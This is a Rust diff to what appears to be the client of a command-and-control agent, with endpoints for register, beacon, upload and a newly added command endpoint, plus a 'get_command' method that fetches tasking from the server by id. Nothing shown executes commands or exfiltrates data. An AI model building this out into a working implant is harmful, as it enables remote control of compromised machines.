@@ -6,6 +6,7 @@ pub struct Connection<'a>{
     reg: &'a str,
     becon: &'a str,
     upload: &'a str,
+    command: &'a str,
     server: reqwest::Client
 }
 
@@ -18,6 +19,7 @@ impl<'a> Connection<'a>{
             reg: "/register",
             becon: "/becon",
             upload: "/upload",
+            command: "/command",
             server: reqwest::Client::new()
         }
     }
@@ -65,28 +67,18 @@ impl<'a> Connection<'a>{
 
         Ok(response.text().await?)
     }
-    // pub fn post_request(&self) -> Result<RecData, ureq::Error>{
 
-    //     let send_body = SendData {sent: "yo".to_string()};
+    pub async fn get_command(&self, id:& str,) -> Result<String, reqwest::Error> {
 
-    //     let body:RecData = ureq::post(self.url)
-    //         .header("example-Header", "Header Value")
-    //         .send_json(&send_body)?
-    //         .body_mut()
-    //         .read_json::<RecData>()?;
+        let url = format!("{}{}",self.url,self.command);
+        let params = [("id", id)];
 
-    //     Ok(body)
-
-    // }
-
-    // pub fn get_request(&self) -> Result<String, ureq::Error> {
-
-    //     let body: String = ureq::get(self.url)
-    //     .header("Example-Header", "header value")
-    //     .call()?
-    //     .body_mut()
-    //     .read_to_string()?;
-    //     Ok(body)
-    // }
+        let response = self.server.get(url)
+        .form(&params)
+        .send()
+        .await?;
+    
+        Ok(response.text().await?)
+    }
     
 }
